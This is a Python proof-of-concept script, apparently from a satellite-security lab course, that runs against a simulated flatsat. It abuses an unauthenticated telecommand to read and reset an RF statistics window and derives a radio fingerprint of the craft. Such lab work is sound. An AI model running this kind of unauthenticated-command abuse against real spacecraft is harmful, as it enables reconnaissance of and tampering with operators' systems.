#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-29  The craft exports a 64-sample RF window (RSSI/SNR/freq-error) of
# the most recent TCs over an unauthenticated command: the attacker
# self-measures his own signal (antenna/pointing tuning) and the operator
# (or the attacker) can train the course's logistic-regression detector
# on this very export.
# SPARTA: CT-0002 / RE-0003.01 (RF fingerprinting)
def main(dev, ev):
    dev.tc(0x20, b"\x01", via="radio")               # reset window
    for i in range(40):
        dev.tc(0x01, b"", via="radio")               # attacker-sent TCs
    st = dev.find(dev.tc(0x20, b"", via="radio"), 0x20)[0]
    n = st.u8(2)
    avg_r = struct.unpack("<h", st.payload[3:5])[0]
    lo, hi = struct.unpack("<hh", st.payload[9:13])
    avg_fe = struct.unpack("<h", st.payload[7:9])[0]
    ev.log(f"window: {n} samples  rssi avg={avg_r} min={lo} max={hi} dBm")
    ev.log(f"frequency error mean {avg_fe} Hz -> crystal calibration "
           f"fingerprint (identifies THIS craft in a constellation)")
    check(39 <= n <= 41, "per-TC sample window captured (64 deep)")
    check(lo <= avg_r <= hi, "consistent stats")
    # second window: statistical fingerprint stability
    dev.tc(0x20, b"\x01", via="radio")
    for i in range(60):
        dev.tc(0x04, b"\x00\x01", via="radio")
    st2 = dev.find(dev.tc(0x20, b"", via="radio"), 0x20)[0]
    avg_r2 = struct.unpack("<h", st2.payload[3:5])[0]
    fe2 = struct.unpack("<h", st2.payload[7:9])[0]
    ev.log(f"window2 (60 TCs): rssi avg={avg_r2} freq_err mean={fe2} Hz "
           f"(drift |dFe|={abs(fe2-avg_fe)} Hz)")
    check(abs(fe2 - avg_fe) < 300, "XO fingerprint stable across windows")
    r = dev.find(dev.tc(0x20, b"\x01", via="radio"), 0x20)[0]
    check(r.u8(1) == 1, "reset accepted (attacker can also scrub)")
    ev.log("=> export is the exact feature vector for the course LR "
           "detector (TinyML, 69.5 us inference on M0+) -- readable raw")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-29 per-TC RF fingerprint export", main))
